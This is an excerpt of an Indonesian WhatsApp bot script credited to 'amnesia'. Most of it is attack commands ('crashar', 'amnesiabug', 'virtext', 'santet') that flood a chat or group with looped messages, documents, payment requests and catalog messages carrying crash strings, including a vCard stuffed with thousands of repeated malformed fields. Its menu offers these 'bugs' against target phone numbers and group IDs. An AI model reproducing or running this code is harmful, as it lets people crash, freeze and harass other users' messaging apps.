...
// Base © ★𝐀𝐦𝐧𝐞𝐬𝐢𝐚★Hw Mods : Copyan Dari Base Dika

› Create By © ★𝐀𝐦𝐧𝐞𝐬𝐢𝐚★
› Base Ori © ★𝐀𝐦𝐧𝐞𝐬𝐢𝐚★
› Copyan Base Dika Hisoka Morou

🌷 KALAU MAU RENAME TARO CREDITS GUA : © ★𝐀𝐦𝐧𝐞𝐬𝐢𝐚★*/
...
//=================================================//
const reply = (teks) => {
return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC © amnesia`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m })} 
//=================================================//
try {
...
haikal.sendMessage(m.chat, { text: util.format(res.data)}, { quoted: tzy })
}
break
case 'jadilokas': {
if (isBan) throw sticBanLu(from)
...
break
case 'jadikatalog': case 'amnesiakatalog': {
if (isBan) throw sticBanLu(from)
...
let teks = `${q}`
{
haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © amnesia`,"body": `Selamat ${salam} kak ${pushname}`,
...
break
case 'amnesiapoll': case 'amnesiajhon2': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
{
"optionName": "SALAM BROTHER BY © amnesia"
}
],
...
break
//=================================================//
case 'amnesiatroli2': case 'amnesiatrol': case 'jutrol': {
if (isBan) throw sticBanLu(from)
...
break
case 'amnesiatroli3': case 'amnesiatrol2': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
...
haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`© amnesiaAPIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
}
}
break
//=================================================//
case 'amnesiadaca': case 'amnesiadaca':  {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 ...
 haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`© amnesiaAPIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'amnesiadocu': case 'amnesiadraknes':  {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
break
//=================================================//
case 'duc': case 'amnesiaslebew': case 'cumadocu': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
break
//=================================================//
case 'amnesiavirtext1': case 'amnesiazsu': case 'crashar1': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© amnesia${iphone}` }, { quoted: doc })
}
}
break
case 'amnesiavirtext2': case 'amnesiatol': case 'crashar2': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© amnesia${iphone1}` }, { quoted: doc })
}
}
break
case 'amnesiavirtext3': case 'amnesiamemek': case 'crashar3': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© amnesia${iphone2}` }, { quoted: doc })
}
}
break
case 'amnesiavirtext4': case 'amnesiacontol': case 'crashar4': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© amnesia${iphone3}` }, { quoted: doc })
}
}
break
case 'amnesiavirtext5': case 'amnesiatextv': case 'crashar5': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© amnesia${iphone4}` }, { quoted: doc })
}
}
break
case 'amnesiavirtext6': case 'amnesiagas': case 'crashar6':{
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© amnesia${iphone5}` }, { quoted: doc })
}
}
break
case 'amnesiavirtext7': case 'amnesiavirtext': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© amnesia${iphone6}` }, { quoted: doc })
}
}
break
case 'amnesiavirtext8': case 'amnesiavirtext1': case 'crashar7':{
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© amnesia${buttonkal}` }, { quoted: doc })
}
}
break
case 'amnesiavirtext9': case 'amnesiavirtext2': case 'crashar8':{
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© amnesia${buttonvirus}` }, { quoted: doc })
}
}
break
case 'amnesiavirtext10': case 'amnesiavirtext3': case 'crashar9': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© amnesia${ngazap(prefix)}`}, { quoted: doc })
}
}
break
//=================================================//
case 'amnesiabug1': case 'amnesiacrash': case 'crashar10':{
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
break
//=================================================//
case 'amnesiabug2': case 'amnesiacrash1': case 'crashar11': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
break
//=================================================//
case 'amnesiabug3': case 'amnesiacrash2': case 'crashar12': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
"fileName": `© © amnesia${ngazap(prefix)}`,
...
break
//=================================================//
case 'amnesiabug4': case 'amnesiacrash3': case 'crashar13':{
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
break
//=================================================//
case 'amnesiabug5': case 'amnesiacrash4': case 'crashar14': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
break
case 'amnesiabug6': case 'amnesiacrash5': case 'crashar15':{
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
break
//=================================================//
case 'amnesiabug7': case 'amnesiacrash6': case 'crashar16':{
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
break
//=================================================//
case 'amnesiabug8': case 'amnesiacrash7': case 'crashar17': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
break
//=================================================//
case 'buglokas': case 'amnesialokas2': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME © amnesia${ngazap(prefix)}`,
"groupName": `MY NAME © amnesia${ngazap(prefix)}`,
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© © amnesia${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
"orderTitle": `© © amnesia${ngazap(prefix)}`,
...
"retailerId": `© © amnesiaWE ARE NOT MASTOD`,
...
break
case '🌷': case 'crashmek': case 'ampunsuhu': case 'ahyangbetul': case 'okemek': case 'amnesianih': case 'crashar18': case 'mexdemam': case 'amnesia1': case 'amnesia2': case 'amnesia3': case 'amnesia4': case 'amnesia5': case 'amnesia6': case 'amnesia7': case 'amnesia8': case 'amnesia9': case 'amnesia10': case 'amnesia11': case 'amnesia12': case 'amnesia13': case 'amnesia14': case 'amnesia15': case 'amnesia16': case 'amnesia17': case 'amnesia18': case 'amnesia19': case 'amnesia20': case 'amnesia21': case 'amnesia22': case 'amnesia23': case 'amnesia24': case 'amnesia25': case 'amnesia26': case 'amnesia27': case 'amnesia28':
case 'amnesia29':
case 'amnesia30':
case 'amnesia31':
case 'amnesia32':
...
break
//=================================================//
case 'amnesiastik': case 'amnesiakangbug': case 'buttonkematian': case 'crashar19': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
break
//=================================================//
case 'amnesiabugie': case 'amnesiakangbug1': case 'crashar20': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
case 'bugbctext': {
if (isBan) throw sticBanLu(from)
if (!text) throw `*Type some text*\n\nExample : ${prefix + command} amnesiamods`
...
break
//=================================================//
case 'amnesiabutton': case 'amnesiakangbuttton': case 'testbutton': case 'inibutton': 
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
haikal.sendMessage(m.chat, buttonMessage)
 ...
 break
//=================================================//
case 'amnesiatag': case 'amnesiabar':  {
if (isBan) throw sticBanLu(from)
...
haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `© amnesia${ngazap(prefix)}.BIN`, title: `© amnesia${ngazap(prefix)}.BIN` }, { quoted: doc })
}
}
break
//=================================================//
case 'amnesiatod': case 'amnesiaewe': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© © amnesia${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© amnesia\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
...
break
//=================================================//
case 'amnesiabokep': case 'amnesiangentod': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
haikal.sendMessage(m.chat, anuala, `© amnesia${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
...
break
//=================================================//
case 'amnesiaghoib': case 'welcome': {
if (isBan) throw sticBanLu(from)
...
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © amnesia, 7, 7, 2005, Putri, 16, 11, 2004`
...
case 'artinama': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © amnesiaGans`
...
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © amnesia, 7, 7, 2005`
...
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © amnesia|Putri`
...
case 'fengshui': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © amnesia, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
...
case 'amnesiasound98':
case 'amnesiasound99':
case 'amnesiasound100':
case 'amnesiasound101':
case 'amnesiasound102':
case 'amnesiasound103':
case 'amnesiasound104':
case 'amnesiasound105':
case 'amnesiasound106':
case 'amnesiasound107':
case 'amnesiasound108':
case 'amnesiasound109':
case 'amnesiasound110':
case 'amnesiasound111':
case 'amnesiasound112':
case 'amnesiasound113':
case 'amnesiasound114':
case 'amnesiasound115':
case 'amnesiasound116':
case 'amnesiasound117':
case 'amnesiasound118':
case 'amnesiasound119':
case 'amnesiasound120':
case 'amnesiasound121':
case 'amnesiasound122':
case 'amnesiasound123':
case 'amnesiasound124':
case 'amnesiasound125':
case 'amnesiasound126':
case 'amnesiasound127':
case 'amnesiasound128':
case 'amnesiasound129':
case 'amnesiasound130':
case 'amnesiasound131':
case 'amnesiasound132':
case 'amnesiasound133':
case 'amnesiasound134':
case 'amnesiasound135':
case 'amnesiasound136':
case 'amnesiasound137':
case 'amnesiasound138':
case 'amnesiasound139':
case 'amnesiasound140':
case 'amnesiasound141':
case 'amnesiasound142':
case 'amnesiasound143':
case 'amnesiasound144':
case 'amnesiasound145':
case 'amnesiasound146':
case 'amnesiasound147':
case 'amnesiasound148':
case 'amnesiasound149':
case 'amnesiasound150':
case 'amnesiasound151':
case 'amnesiasound152':
case 'amnesiasound153':
case 'amnesiasound154':
case 'amnesiasound155':
case 'amnesiasound156':
case 'amnesiasound157':
case 'amnesiasound158':
case 'amnesiasound159':
case 'amnesiasound160':
case 'amnesiasound161':
 if (isBan) throw sticBanLu(from)
...
┗━━⊱
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
© amnesia`, contextInfo:{"externalAdReply": {"title": `SC Bot_amnesia`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
...
[ BUG REPLY GROUP ]
┏━━⊱
┣❏amnesiajagoan [ reply target ]
┗━━⊱
[ BUG SANGE HARUS ADMIN ]
┏━━⊱
┣❏amnesiasange [ Harus Menjadi Admin ]
┗━━⊱
...
┣❏amnesiasantet 628xxx@s.whatsapp.net|10|10s
...
[ SANTET GROUP ]
┏━━⊱
┣❏amnesiasantetgc  628xxx@g.us|10|10s
┣❏santetbro 628xxx@g.us|10|10s
┣❏cataloggc 628xxx@g.us|10|10s
┗━━⊱
[ UNLIMITED BUG GROUP ]
┏━━⊱
┣❏gasamnesia (id group nya)
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
[ JADI BUG ]
┏━━⊱
...
[ VIRTEXT DELAY ]
┏━━⊱
┣❏amnesia𝐯irtext1 [ jumlah ]
┣❏amnesia𝐯irtext2 [ jumlah ]
┣❏amnesia𝐯irtext3 [ jumlah ]
┣❏amnesia𝐯irtext4 [ jumlah ]
┣❏amnesia𝐯irtext5 [ jumlah ]
┣❏amnesia𝐯irtext6 [ jumlah ]
┣❏amnesia𝐯irtext7 [ jumlah ]
┣❏amnesia𝐯irtext8 [ jumlah ]
┣❏amnesia𝐯irtext9 [ jumlah ]
┣❏amnesia𝐯irtext10 [ jumlah ]
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
...
┣❏ducu [ jumlah ]
┣❏amnesiatroli [ jumlah ]
┣❏amnesiatroli2 [ jumlah ]
┣❏amnesiatroli3 [ jumlah ]
┣❏amnesiajhon2 [ jumlah ]
┣❏amnesiajhon [ jumlah ]
┣❏amnesiabutton [ jumlah ]
┣❏amnesiatrol [ jumlah ]
┣❏amnesiakatalog [ jumlah ]
┣❏amnesiaducu [ jumlah ]
┣❏amnesiadaca [ jumlah ]
┣❏amnesiadraknes [ jumlah ]
┣❏amnesiaslebew [ jumlah ]
┣❏amnesiasu [ jumlah ]
┣❏amnesiatol [ jumlah ]
┣❏amnesiamemek [ jumlah ]
┣❏amnesiacontol [ jumlah ]
┣❏amnesiatext𝐯 [ jumlah ]
┣❏amnesiagas [ jumlah ]
